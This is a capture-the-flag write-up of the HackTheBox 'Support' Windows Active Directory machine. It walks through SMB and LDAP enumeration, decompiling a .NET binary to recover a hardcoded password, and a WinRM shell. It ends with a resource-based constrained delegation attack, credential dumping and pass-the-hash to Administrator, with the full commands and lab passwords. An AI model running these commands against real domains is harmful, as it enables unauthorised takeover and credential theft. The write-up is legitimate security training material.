
## Support — HackTheBox Writeup

**Difficulty:** Easy | **OS:** Windows | **Category:** Active Directory

---

## Reconnaissance

**Port Enumeration**

We begin with a full TCP port scan using **Nmap**:

```bash
nmap -p- --open -n -Pn -T5 -sS -vvv <TARGET_IP> -oN Scan
```

<img src="/budahacksecurity/uploads/md_images/support/sup.png" style="max-width:100%; border-radius:8px;">

To extract only the open port numbers cleanly:

```bash
batcat -l java Scan | awk -F '/' '/^[0-9]+\/tcp/ {printf "%s,", $1}' | sed 's/,$//'
```

<img src="/budahacksecurity/uploads/md_images/support/sup2.png" style="max-width:100%; border-radius:8px;">

We then run Nmap's scripting engine against the identified ports for deeper service enumeration.

<img src="/budahacksecurity/uploads/md_images/support/sup3.png" style="max-width:100%; border-radius:8px;">

The scan reveals the hostname **DC** and domain **support.htb**. We add these to `/etc/hosts`:

```
<TARGET_IP>  DC.support.htb support.htb
```

---

## LDAP Enumeration

```bash
ldapsearch -x -s base -b "" namingcontexts -H ldap://support.htb
```

<img src="/budahacksecurity/uploads/md_images/support/sup4.png" style="max-width:100%; border-radius:8px;">

```bash
ldapsearch -x -s base -b "DC=support,DC=htb" namingcontexts -H ldap://support.htb
```

<img src="/budahacksecurity/uploads/md_images/support/sup5.png" style="max-width:100%; border-radius:8px;">

---

## SMB Enumeration

```bash
crackmapexec smb support.htb
```

<img src="/budahacksecurity/uploads/md_images/support/sup6.png" style="max-width:100%; border-radius:8px;">

```bash
crackmapexec smb support.htb --shares
```

<img src="/budahacksecurity/uploads/md_images/support/sup7.png" style="max-width:100%; border-radius:8px;">

While CrackMapExec, smbmap, and enum4linux fail to return results anonymously, **smbclient** succeeds:

```bash
smbclient -N -L //support.htb
```

<img src="/budahacksecurity/uploads/md_images/support/sup8.png" style="max-width:100%; border-radius:8px;">

`ADMIN$` and `C$` deny access as expected:

<img src="/budahacksecurity/uploads/md_images/support/sup9.png" style="max-width:100%; border-radius:8px;">

`NETLOGON` and `SYSVOL` are visible but not enumerable:

<img src="/budahacksecurity/uploads/md_images/support/sup10.png" style="max-width:100%; border-radius:8px;">

The **`support-tools`** share is accessible and contains mostly public utilities — with one notable exception: **`UserInfo.exe`**:

<img src="/budahacksecurity/uploads/md_images/support/sup11.png" style="max-width:100%; border-radius:8px;">

```bash
get UserInfo.exe.zip
```

<img src="/budahacksecurity/uploads/md_images/support/sup12.png" style="max-width:100%; border-radius:8px;">

The archive contains 12 files including the target binary:

<img src="/budahacksecurity/uploads/md_images/support/sup13.png" style="max-width:100%; border-radius:8px;">

File analysis confirms this is a **32-bit .NET executable**:

<img src="/budahacksecurity/uploads/md_images/support/sup14.png" style="max-width:100%; border-radius:8px;">

---

## Reverse Engineering UserInfo.exe

Since we cannot run Windows binaries natively on Linux, we pivot to a Windows 10 environment:

<img src="/budahacksecurity/uploads/md_images/support/sup15.png" style="max-width:100%; border-radius:8px;">

<img src="/budahacksecurity/uploads/md_images/support/sup16.png" style="max-width:100%; border-radius:8px;">

The binary fails to connect. Inspecting strings confirms it requires `LDAP://support.htb`:

```bash
strings --encoding l UserInfo.exe
```

<img src="/budahacksecurity/uploads/md_images/support/sup17.png" style="max-width:100%; border-radius:8px;">

We add the entry to `C:\Windows\System32\drivers\etc\hosts`:

<img src="/budahacksecurity/uploads/md_images/support/sup18.png" style="max-width:100%; border-radius:8px;">

Connectivity confirmed:

```bash
ping support.htb
```

<img src="/budahacksecurity/uploads/md_images/support/sup19.png" style="max-width:100%; border-radius:8px;">

The tool now returns a list of **15 domain users**:

<img src="/budahacksecurity/uploads/md_images/support/sup20.png" style="max-width:100%; border-radius:8px;">

### Static Analysis with dnSpy

We load the binary into **[dnSpy](https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8)**:

<img src="/budahacksecurity/uploads/md_images/support/sup21.png" style="max-width:100%; border-radius:8px;">

The decompiled code reveals a hardcoded **encoded password** used to authenticate the `ldap` service account:

<img src="/budahacksecurity/uploads/md_images/support/sup22.png" style="max-width:100%; border-radius:8px;">

A decryption routine decodes it at runtime:

<img src="/budahacksecurity/uploads/md_images/support/sup23.png" style="max-width:100%; border-radius:8px;">

---

## Credential Validation & LDAP Dump

```bash
crackmapexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

<img src="/budahacksecurity/uploads/md_images/support/sup24.png" style="max-width:100%; border-radius:8px;">

With confirmed credentials, we perform an authenticated LDAP dump:

```bash
ldapsearch -H ldap://support.htb -D "ldap@support.htb" -w '<password>' -b "DC=support,DC=htb"
```

<img src="/budahacksecurity/uploads/md_images/support/sup25.png" style="max-width:100%; border-radius:8px;">

The string `Ironside47pleasure40Watchful` appears embedded in a user object's non-standard attribute field — almost certainly a password stored in the wrong place. We test it against WinRM:

```bash
crackmapexec winrm <TARGET_IP> -u support -p 'Ironside47pleasure40Watchful'
```

<img src="/budahacksecurity/uploads/md_images/support/sup26.png" style="max-width:100%; border-radius:8px;">

Credentials confirmed. We establish a shell with **Evil-WinRM**:

```bash
evil-winrm -i <TARGET_IP> -u 'support' -p 'Ironside47pleasure40Watchful'
```

<img src="/budahacksecurity/uploads/md_images/support/sup27.png" style="max-width:100%; border-radius:8px;">

**User flag obtained. ✓**

---

#### Privilege Escalation

### BloodHound Enumeration

We upload **SharpHound.ps1** and collect domain data:

```powershell
upload /home/bda/Desktop/herramientas/SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\support\Desktop
download 20260325110151_BloodHound.zip /home/bda/Desktop/
```

After importing into BloodHound, the attack path is clear: the `support` user holds **GenericAll** over the DC object, enabling a **Resource-Based Constrained Delegation (RBCD)** attack.

### RBCD Attack

**Step 1 — Create a machine account**

Using **Powermad**, we create a machine account under our control:

```powershell
New-MachineAccount -MachineAccount bda -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

**Step 2 — Configure delegation**

```powershell
Set-ADComputer dc -PrincipalsAllowedToDelegateToAccount bda$
Get-ADComputer dc -Properties PrincipalsAllowedToDelegateToAccount
```

`bda$` is now listed in `PrincipalsAllowedToDelegateToAccount` — RBCD is configured.

**Step 3 — Request a Kerberos ticket**

Using **Impacket's** `getST.py`, we perform the S4U2Self/S4U2Proxy exchange to impersonate `Administrator`:

```bash
getST.py -spn cifs/dc.support.htb -impersonate Administrator 'support.htb/bda$:123456'
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

**Step 4 — Dump credentials**

```bash
secretsdump.py -k -no-pass dc.support.htb
```

**Step 5 — Pass-the-Hash**

```bash
evil-winrm -i dc.support.htb -u Administrator -H <NTLM_HASH>
```

<img src="/budahacksecurity/uploads/md_images/support/sup28.png" style="max-width:100%; border-radius:8px;">

